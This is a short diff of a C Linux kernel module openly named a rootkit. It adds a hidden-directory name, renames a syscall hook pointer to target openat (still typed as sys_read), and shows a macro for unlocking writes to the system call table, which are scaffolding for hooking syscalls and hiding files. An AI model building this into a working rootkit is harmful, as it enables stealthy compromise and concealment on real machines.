@@ -15,6 +15,7 @@
 #define DEVICE_NAME "rootkit-test"
 #define TEST_MSG "Inserting Rootkit"
 #define MSG_BUF_LEN 100
+#define HIDDEN_DIR ".rtkt"
 
 //Device function declerations
 static int rootkit_load(void);
@@ -34,7 +35,7 @@ static int Device_Open = 0;
 static int USE_COUNT = 0;
 
 //Globals for intercepts
-static typeof(sys_read) *orig_read;
+static typeof(sys_read) *orig_openat;
 
 //Allow writes to sys_call_table
 #define CRO_WRITE_UNLOCK(x) \
